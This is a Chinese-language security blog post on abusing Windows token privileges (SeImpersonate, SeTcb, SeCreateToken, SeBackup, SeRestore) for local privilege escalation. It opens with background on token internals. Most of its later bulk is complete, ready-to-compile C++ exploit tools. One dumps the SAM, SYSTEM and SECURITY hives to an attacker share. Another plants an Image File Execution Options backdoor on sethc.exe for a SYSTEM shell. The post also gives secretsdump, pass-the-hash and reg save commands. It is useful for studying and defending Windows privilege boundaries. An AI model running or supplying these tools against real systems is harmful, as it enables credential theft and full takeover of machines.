---
title: Revisiting a Token Privileges Abusing For Windows Local Privilege Escalation
date: 2022-03-29 11:26:00 +0800
author: WHOAMI
toc: true
categories: 域安全
tags: 域安全
layout: post
---

在过去几年中，Windows 内核利用变得越来越复杂，尤其是随着 Windows 10 的发布及其连续的核心更新。除了内核利用之外，还可以通过其他方式滥用令牌特权。在服务帐户遭到破坏且启用了非标准权限的情况下，通常可以利用它们来获得本地特权提升。

执行此操作的方法特定于每种特权。本文整合了不同的资源，为滥用令牌特权的方法提供了完整的参考。

[toc]

# # Token Overview

我们滥用令牌特权的基础源于 Windows 中对象访问控制模型的核心。Windows 使用令牌对象来描述特定线程或进程的安全上下文。这些由 `nt!_TOKEN` 结构表示的令牌对象包含大量安全和参考信息，包括完整性级别、特权、组等。我们的重点在于这些令牌中包含的特权部分。

## ## Windows Privilege Model

系统上的每个进程都在其 [`EPROCESS`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) 结构中持有一个令牌对象引用，以便在对象访问协商或特权系统任务期间使用，如下所示。此令牌在登录过程中通过 LSASS 授予，因此会话中的所有进程最初都在同一令牌下运行。

```ruby
kd> dt _eprocess ffffa88e400d0080
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   // ...
   +0x358 ExceptionPortState : 0y000
   +0x360 Token            : _EX_FAST_REF
   +0x368 MmReserved       : 0
   +0x370 AddressCreationLock : _EX_PUSH_LOCK
   +0x378 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x380 RotateInProgress : (null) 
   +0x388 ForkInProgress   : (null) 
   // ...
```

一个进程持有一个主令牌，在进程中执行的线程继承这个相同的令牌。当线程需要使用一组不同的凭据访问对象时，它可以使用模拟令牌。使用模拟令牌不会影响主令牌或其他线程，只会在模拟线程的上下文中执行。这些模拟令牌可以通过内核提供的许多不同的 API 获得。

令牌用作进程访问票证，必须提交给 Windows 中的各种看门人，并在访问对象时通过 `SeAccessCheck()` 函数进行评估，在特权操作期间通过 `SeSinglePrivilegeCheck()` 函数进行评估。例如，当进程请求对文件的写访问权时，`SeAccessCheck()` 函数将评估令牌完整性级别，然后评估其自主访问控制列表（DACL）。 当进程试图通过 `NtShutdownSystem()` 关闭系统时，内核将评估请求进程令牌是否启用了 `SeShutdownPrivilege` 特权。

## ## Token Structure and Privileges

如前所述，`_TOKEN` 结构主要包含有关进程或线程的安全上下文信息，如下所示：

```ruby
kd> dt _TOKEN ffff838b73a1a6b0
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffa88e`3fccb590 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0x13
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x2a4
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 4
   +0x098 UserAndGroups    : 0xffff838b`73a1ab40 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffff838b`740c1b10 Void
   +0x0b0 DynamicPart      : 0xffff838b`740c1b10  -> 0x501
   +0x0b8 DefaultDacl      : 0xffff838b`740c1b2c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2000
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0x12
   +0x0d4 MandatoryPolicy  : 3
   +0x0d8 LogonSession     : 0xffff838b`720fc840 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : 0xffff838b`7163e6d0 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : (null) 
   +0x318 Capabilities     : (null) 
   +0x320 CapabilityCount  : 0
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : (null) 
   +0x440 LowboxHandlesEntry : (null) 
   +0x448 pClaimAttributes : (null) 
   +0x450 TrustLevelSid    : (null) 
   +0x458 TrustLinkedToken : (null) 
   +0x460 IntegrityLevelSidValue : (null) 
   +0x468 TokenSidValues   : (null) 
   +0x470 IndexEntry       : 0xffff838b`7281a370 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : (null) 
   +0x480 BnoIsolationHandlesEntry : (null) 
   +0x488 SessionObject    : 0xffffa88e`3a33e180 Void
   +0x490 VariablePart     : 0xffff838b`73a1ac70
```

我们关注的重点是该结构中的 `_SEP_TOKEN_PRIVILEGES` 条目，位于 0x40 偏移量处，包含令牌特权信息：

```ruby
kd> dt nt!_SEP_TOKEN_PRIVILEGES ffff838b73a1a6b0+0x40
   +0x000 Present          : 0x0000001e`73deff20
   +0x008 Enabled          : 0x60800000
   +0x010 EnabledByDefault : 0x60800000
```

`Present` 条目是一个 unsigned long long 型，其中包含令牌的当前特权。这并不意味着它们被启用或禁用，而只是它们存在于令牌上。创建令牌后，您无法为其添加特权，而只能启用或禁用在此字段中找到的现有项。第二个字段 `Enabled` 也是一个 unsigned long long 型，其中包含令牌上所有已启用的特权。特权必须在此位掩码中启用才能通过 `SeSinglePrivilegeCheck()` 的评估。最后一个字段 `EnabledByDefault` 表示令牌在构思时的默认状态。可以通过调整这些字段中的特定位来启用或禁用特权。

此外，通过 Windows 的 `AdjustTokenPrivileges()` 函数，能够启用或禁用指定访问令牌中的特权。在访问令牌中启用或禁用特权需要 `TOKEN_ADJUST_PRIVILEGES` 访问权限。

尽管从表面上看，为各种任务定义特定特权的令牌安全模型似乎允许实施特定于服务的细粒度访问控制，但仔细观察会发现更复杂的情况。许多权限在启用时允许用户执行可导致权限提升的特权操作。 这有效地破坏了“细粒度”访问控制结构，并可能提供虚假的安全感。

## ## Token Impersonation

在深入研究特权之前，我们先介绍一下 “令牌模拟级别” 得概念描述，这是用于确定特定线程是否可以使用给定令牌的 Windows 机制。任何用户都可以获得特权令牌的句柄，但能否实际使用它是另一回事。

在 Windows 中，“令牌模拟” 是指将新令牌分配给不同于父进程令牌的线程。尽管 “模拟” 一词暗示一个用户正在使用属于另一个用户的令牌，但情况并非总是如此。用户可以模拟属于他们的令牌，但只是具有一组不同的特权或一些其他修改。

每个令牌中指定的字段之一是令牌模拟级别，该字段控制该令牌是否可用于模拟目的以及在何种程度上进行模拟。有以下四种模拟级别：

|        模拟级别        |                             说明                             |
| :--------------------: | :----------------------------------------------------------: |
|   SecurityAnonymous    |    服务器进程无法获取客户端的身份信息，也无法模拟客户端。    |
| SecurityIdentification |     服务器可以获得客户端的身份和权限，但不能模拟客户端。     |
| SecurityImpersonation  | 服务器进程可以在其本地系统上模拟客户端的安全上下文。服务器无法模拟远程系统上的客户端。 |
|   SecurityDelegation   |      服务器进程可以在远程系统上模拟客户端的安全上下文。      |

SecurityImpersonation 和 SecurityDelegation 是我们最感兴趣的模拟级别，而 SecurityIdentification 级别及更低级别的令牌不能用于运行代码。

对于是否允许给定用户模拟特定令牌，可以确定如下规则：

> - IF the token level < Impersonate THEN allow (such tokens are called “Identification” level and can not be used for privileged actions).  
> - IF the process has “Impersonate” privilege THEN allow.  
> - IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible).

# # Abusing Token Privileges

出于本文的目的，我们将可以单独使用以获得目标系统的 NT AUTHORITY\SYSTEM 级别访问权限的任何令牌特权定义为 “可利用特权”。

正如在前文中提到的，`nt!_SEP_TOKEN_PRIVILEGES` 结构是令牌中的一个二进制字段，其中每一位确定给定的特权是否存在或在令牌中是否启用。

本节的其余部分将详细介绍我们能够成功滥用以获得提升的特权的每种特权。该项目包含利用每一种特权的代码示例。

## ## SeImpersonatePrivilege  *

SeImpersonatePrivilege 在 Microsoft 官方文档中被描述为 “*Impersonate a client after authentication*”，拥有此特权的任何进程都可以模拟它能够获得句柄的任何令牌。但是，此特权不允许创建新令牌。

这个特殊权限非常有趣，因为许多常见的 Windows 服务帐户都需要它，例如 LocalService 以及用于 MSSQL 和 IIS 的帐户。如果任何此类帐户受到威胁，则对该特权的利用就会导致特权提升。

熟悉 “Potato” 系列提权的朋友应该知道，它们早期的利用思路几乎都是相同的，就是想方设法获取 NT AUTHORITY\SYSTEM 帐户的令牌句柄。例如，利用 COM 接口的一些特性，欺骗 NT AUTHORITY\SYSTEM 账户连接并验证到攻击者控制的 TCP 侦听器。通过一系列 API 调用对这个认证过程执行中间人（NTLM Relay）攻击，以在本地计算机上为 NT AUTHORITY\SYSTEM 账户创建一个访问令牌。

任何用户都可以执行前面描述的过程来获得 NT AUTHORITY\SYSTEM 帐户的令牌句柄，但是为了使用这个句柄，需要模拟的能力，而 SeImpersonatePrivilege 特权正好允许我们这样做。使用提升的令牌生成新进程需要调用的 `CreateProcessWithTokenW()` 函数，将新令牌作为第一个参数传递。

## ## SeAssignPrimaryTokenPrivilege *

SeAssignPrimaryTokenPrivilege 特权在攻击面上与前面讨论的 SeImpersonatePrivilege 非常相似，它被描述为 “*Assign the primary token of a process*”，拥有该特权的任何进程都可以将主令牌分配给指定的进程。该特权的利用策略是使用提升的令牌生成一个新进程。

为了创建具有特权令牌的新进程，我们首先需要获取此类令牌的句柄。为此，我们遵循 “SeImpersonatePrivilege” 节中描述的过程。

正如此特权的名称所暗示的那样，它允许我们将主令牌分配给新的或挂起的进程。使用 “SeImpersonatePrivilege” 节中概述的策略来获取令牌，此时已经拥有一个特权模拟令牌，因此需要首先从中派生出一个主令牌。这可以通过 `DuplicateTokenEx()` 函数来完成：

```c++
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken)
```

有了特权主令牌，我们现在有几个选择。不幸的是，我们不能简单地将当前正在运行的进程的令牌替换为提升的进程，因为不支持更改正在运行的进程上的主要令牌的行为。这是由 `EPROCESS` 结构中的 `PrimaryTokenFrozen` 字段控制的。

最简单的选择是使用新令牌作为参数调用 `CreateProcessAsUser` 函数来创建一个新的、高特权的进程。或者，我们可以在挂起状态下生成一个新进程并执行与上述相同的操作，当通过指定 `CREATE_SUSPENDED` 标志创建新进程时，`PrimaryTokenFrozen` 的值尚未设置，允许替换令牌。

## ## SeTcbPrivilege *

SeTcbPrivilege 特权非常有趣， Microsoft 官方文档中被描述为 “Act as part of the operating system”，除此之外，许多书籍、文章和论坛帖子都将 SeTcbPrivilege 特权描述为等同于对机器的完全特权访问。拥有该特权的任何进程可以调用 `LsaLogonUser()` 函数执行创建登录令牌等操作，因此可以充当任意用户。

通常，`LsaLogonUser()` 函数用于使用某种形式的凭据对用户进行身份验证。在  Microsoft 官方文档中， `LsaLogonUser()` 函数定义如下。

```c++
NTSTATUS LsaLogonUser(
  [in]           HANDLE              LsaHandle,
  [in]           PLSA_STRING         OriginName,
  [in]           SECURITY_LOGON_TYPE LogonType,
  [in]           ULONG               AuthenticationPackage,
  [in]           PVOID               AuthenticationInformation,
  [in]           ULONG               AuthenticationInformationLength,
  [in, optional] PTOKEN_GROUPS       LocalGroups,
  [in]           PTOKEN_SOURCE       SourceContext,
  [out]          PVOID               *ProfileBuffer,
  [out]          PULONG              ProfileBufferLength,
  [out]          PLUID               LogonId,
  [out]          PHANDLE             Token,
  [out]          PQUOTA_LIMITS       Quotas,
  [out]          PNTSTATUS           SubStatus
);
```

其第一个参数 `LsaHandle` 指定从上一次调用 `LsaRegisterLogonProcess()` 函数获得的句柄。当以下一项或多项为 True 时，调用方需要具有 SeTcbPrivilege：

- 使用子身份验证包。
- 使用 KERB_S4U_LOGON，调用方请求模拟令牌。
- `LocalGroups` 参数不是 NULL。

这里我们主要关注第 2、3 点，从文档描述来看，如果使用 KERB_S4U_LOGON 来登录，那么我们作为调用者就可以拿到一张模拟令牌。

但是，在实际操作中，我们又该尝试登录哪个用户？此外，由于我们没有 SeImpersonatePrivilege 特权，我们又将如何模拟生成的令牌？

值得庆幸的是，James Forshaw 曾说话一句非常关键的话：

> “*you could use LsaLogonUser to add admin group to a token of your own user, then impersonate.*” 

也就是说，我们可以使用 `LsaLogonUser()` 函数将管理员组添加到您自己用户的令牌中，然后进行模拟。

这似乎非常符合我们正在努力做的事情，使用 S4U 登录类型，我们可以获得任何用户的令牌。回顾上面 `LsaHandle` 参数的描述，如果我们有 SeTcbPrivilege 特权，显然生成的令牌可以是模拟令牌，这意味着我们可以将它分配给线程。

再次参考 `LsaHandle` 参数，最后一个要点暗示我们可以使用 SeTcbPrivilege 特权调用 `LsaLogonUser()` 函数并将任意组添加到此调用返回的结果令牌中。我们可以将 “S-1-5-18” 组 SID 添加到结果令牌，这是本地系统帐户的 SID，如果我们使用拥有它的令牌，我们将拥有系统的全部权限。添加 SYSTEM 帐户的 SID 非常简单，就是操作 `LsaLogonUser()` 的 `LocalGroups` 参数：

```c++
WCHAR systemSID[] = L"S-1-5-18"; 
ConvertStringSidToSid(systemSID, &pExtraSid);

pGroups->Groups[pGroups->GroupCount].Attributes = 
                    SE_GROUP_ENABLED | SE_GROUP_MANDATORY; 
pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
pGroups->GroupCount++;
```

这个难题中唯一剩下的部分是我们将如何使用生成的模拟令牌，因为我们假设我们拥有 SeTcbPrivilege 特权，但没有其他与模拟相关的特权。回顾前文有关令牌模拟的相关规则，只要令牌是给我们当前用户的并且完整性级别小于或等于当前进程完整性级别，我们就应该能够在没有任何特殊权限的情况下模拟令牌。令牌的完整性级别可以在构造令牌时设置。因此，使用 `LsaLogonUser()` 返回的令牌，我们只需将完整性级别设置为 “Medium”，然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌。

## ## SeCreateTokenPrivilege *

SeCreateTokenPrivilege 特权在 Microsoft 官方文档中被描述为 “*Create a token object*”，拥有该特权的任何进程能够通过 ZwCreateToken API 创建主令牌。不幸的是，仅此特权并不允许我们使用刚刚创建的令牌。因此，为 NT AUTHORITY\SYSTEM 等高权限用户创建和使用令牌的尝试无法成功。

回忆前文中的令牌模拟规则，即使没有 SeImpersonatePrivilege 特权，用户也可以模拟令牌，只要令牌是针对同一用户的，并且完整性级别小于或等于当前进程完整性级别。令牌的完整性级别可以在构造令牌时设置。

为了利用 SeCreateTokenPrivilege 特权，我们只需要制作一个新的模拟令牌来匹配请求令牌并添加特权组 SID。

如前所述，我们希望在令牌上启用本地管理员组。为此，我们使用组的 RID 构建一个 SID：

```c++
SID_BUILTIN SIDLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32,
								   DOMAIN_ALIAS_RID_ADMINS } };
```

然后我们遍历令牌的组并将其从当前用户提升为管理员：

```c++
for (int i = 0; i < groups->GroupCount; ++i, pSid++) 
{ 
    PISID piSid = (PISID)pSid->Sid;
    if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
    {
      memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
      pSid->Attributes = SE_GROUP_ENABLED; 
	}
}
```

最后的更改是确保我们正在构建 TokenImpersonation 令牌，这可以在令牌的对象属性中设置：

```c++
SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), 
                                     SecurityImpersonation,
                                     SECURITY_STATIC_TRACKING, FALSE }; 
OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
```

最终我们可以使用模拟令牌启动线程。

## ## SeBackupPrivilege

SeBackupPrivilege 特权在 Microsoft 官方文档中被描述为 “*Back up files and directories*”，拥有该特权的任何进程被授予对任何文件或对象的所有读取访问控制，而不管为文件或对象指定的访问控制列表（ACL）。除读取之外的任何访问请求仍使用 ACL 进行评估。

滥用该特权，我们可以调用 `RegSaveKeyW()` 函数将 SAM 注册表转储到本地文件中，如下所示。

```c++
// Saves the specified key and all of its subkeys and values to a new file.
lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
if (lResult != ERROR_SUCCESS)
{
	wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
	return status;
}
wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
```

然后从转储文件中读取本地管理员帐户的密码哈希值，得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权，然后调用 `RegOpenKeyExW()` 函数打开并读取 `HKLM\SAM`、`HKLM\SECURITY` 和`HKLM\SYSTEM` 注册表，最后用 `RegSaveKeyW()` 函数将上述注册表保存到文件。

- SeBackupPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

BOOL ExploitSeBackupPrivilege(LPCWSTR savePath)
{
	BOOL status = FALSE;
	DWORD lResult;
	HKEY hKey;
	LPCWSTR subKeys[] = { L"SAM", L"SYSTEM",L"SECURITY" };

	for (int i = 0; i < 3; i++)
	{
		// Opens the specified registry key.
		lResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKeys[i], REG_OPTION_BACKUP_RESTORE, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegOpenKeyExW Error: [%u].\n", lResult);
			return status;
		}
		// Saves the specified key and all of its subkeys and values to a new file.
		lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
			return status;
		}
		wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
		status = TRUE;
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeBackupPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h           Show this help message and exit\n"
		L"  -o <PATH>    Where to store the sam / system / security files (can be UNC path)\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken    = NULL;
    LPCWSTR savePath = L"C:\\Users\\Public";

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'o':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                savePath = (LPCWSTR)argv[1];
            }
            break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
        }

        ++argv;
        --argc;
    }

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeBackupPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_BACKUP_NAME))
	{
		if (ExploitSeBackupPrivilege(savePath))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将 SAM 注册表转储并导出到文件。这里通过 `-o` 选项指定保存的路径，笔者指定 UNC 路径将注册表保存到远程共享中，避免当前用户在本地系统上没有写入权限的情况，如下所示。

```c++
SeBackupPrivilege.exe -o \\172.26.10.128\evilsmb
```

![image-20230208220939973](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230208220939973.png)

接着，我们通过解析 SAM 数据库获得本地管理员的哈希，如下图所示。

```bash
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

![image-20230208214808892](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230208214808892.png)

最后，使用管理员哈希执行哈希传递，获取目标系统管理权限，如下图所示。

```bash
python3 wmiexec.py ./Administrator@172.26.10.21 -hashes :cb136a448767792bae25563a498a86e6
```

![image-20230208214159428](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230208214159428.png)

当然，我们可以直接通过 `reg save` 命令将 SAM 注册表导出，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权。

```cmd
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

![image-20230208220621473](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230208220621473.png)

## ## SeRestorePrivilege

SeRestorePrivilege 特权在 Microsoft 官方文档中被描述为 “*Restore files and directories*”，拥有该特权的任何进程被授予对系统上任何文件或对象的所有写访问控制，而不管为文件或对象指定的访问控制列表（ACL）。 此外，此特权允许其持有进程或线程更改文件的所有者。

在通过 API 利用此特权时，必须向支持的 API 提供相应的 `_BACKUP_` 标志，例如 `CreateFile()` 函数需要指定 `FILE_FLAG_BACKUP_SEMANTICS` 标志，`RegCreateKeyEx()` 函数需要指定 `REG_OPTION_BACKUP_RESTORE` 标志。这提示内核请求进程可能启用了 SeBackupPrivilege 或 SeRestorePrivilege，并无视 ACL 检查。

利用该特权任意写入 HKLM 注册表能够实现特权提升。例如，我们选择使用 Image File Execution Options 键，用于在系统上调试软件。启动系统二进制文件时，如果在以下注册表位置中存在一个条目并且它包含一个调试器键值，它将执行设置的条目，实现映像劫持。

```powershell
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

此外，还可以将 DLL 放入系统文件夹中以进行 DLL 劫持、覆盖关键系统资源或修改其他服务等方式实现特权提升。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Dubugger”，则调用 `RegCreateKeyExW()` 函数在 `Image File Execution Options` 注册表下创建一个子项，然后用 `RegSetValueExW()` 函数为指定的程序（默认为 sethc.exe）设置 Debugger 键实现映像劫持（默认将 Debugger 键设为 C:\Windows\System32\cmd.exe）。如果 `-e` 参数为 “File”，则通过 `CreateFileW()` 函数创建文件进行 DLL 劫持、覆盖关键系统资源或修改其他服务等。

- SeRestorePrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

#define SIZE 200000

BOOL ExploitSeRestorePrivilege(LPCWSTR expType, LPCWSTR program, LPCWSTR command, LPCWSTR sourceFile, LPCWSTR destFile)
{
	BOOL status = FALSE;
	DWORD lResult;
	HKEY hKey;
	HANDLE hSource, hDestination;
	char buffer[SIZE + 1];
	DWORD dwBytesRead, dwBytesWrite;

	if (!wcscmp(expType, L"Dubugger"))
	{
		// Creates the specified registry key.
		lResult = RegCreateKeyExW(
			HKEY_LOCAL_MACHINE, 
			std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").append(program).c_str(), 
			0, 
			NULL,
			REG_OPTION_BACKUP_RESTORE,
			KEY_SET_VALUE, 
			NULL, 
			&hKey, 
			NULL
		);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
			return status;
		}
		// Sets the data and type of a specified value under a registry key.
		lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)command, (wcslen(command) + 1) * sizeof(WCHAR));
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
			return status;
		}
		wprintf(L"[*] Set Image File Execution Options for %ws successfully with Debugger as %ws.\n", program, command);
		status = TRUE;
	}
	else if(!wcscmp(expType, L"File"))
	{
		if (sourceFile && destFile)
		{
			// Open source file.
			hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hSource == INVALID_HANDLE_VALUE)
			{
				wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
				return status;
			}
			// Create destination file.
			hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
			if (hDestination == INVALID_HANDLE_VALUE)
			{
				wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
				return status;
			}
			// Read from source file.
			if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
			{
				wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
				return status;
			}
			wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
			// Write to destination file.
			if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
			{
				wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
				return status;
			}
			printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
			status = TRUE;
		}
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeRestorePrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                     Show this help message and exit\n"
		L"  -e <Dubugger, File>    Choose the type of exploit.\n"
		L"  -p <Program>           Specifies the original program name to IFEO hijacking.\n"
		L"  -c <Program>           Specifies the program to execute after IFEO hijacking.\n"
		L"  -s <Source>            Source file to read.\n"
		L"  -d <Destination>       Destination file to write.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken      = NULL;
	LPCWSTR expType    = L"Dubugger";
	LPCWSTR program    = L"sethc.exe";
	LPCWSTR command    = L"\"C:\\Windows\\System32\\cmd.exe\"";
	LPCWSTR sourceFile = NULL;
	LPCWSTR destFile   = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				expType = (LPCWSTR)argv[1];
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				program = (LPCWSTR)argv[1];
			}
			break;
		case 'c':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				command = (LPCWSTR)argv[1];
			}
			break;
		case 's':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				sourceFile = (LPCWSTR)argv[1];
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				destFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeRestorePrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_RESTORE_NAME))
	{
		if (ExploitSeRestorePrivilege(expType, program, command, sourceFile, destFile))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeRestorePrivilege.exe 上传到目标主机，执行以下命令，在 `Image File Execution Options` 注册表下创建一个子项 sethc.exe，并将  Debugger 键值设为 C:\Windows\System32\cmd.exe，如下图所示。

```cmd
SeRestorePrivilege.exe -e Dubugger -p sethc.exe -c C:\Windows\System32\cmd.exe
```

![image-20230209113121331](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230209113121331.png)

然后，在目标主机的远程桌面登录屏幕中连按 5 次 Shift 键即可获取一个命令行窗口，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

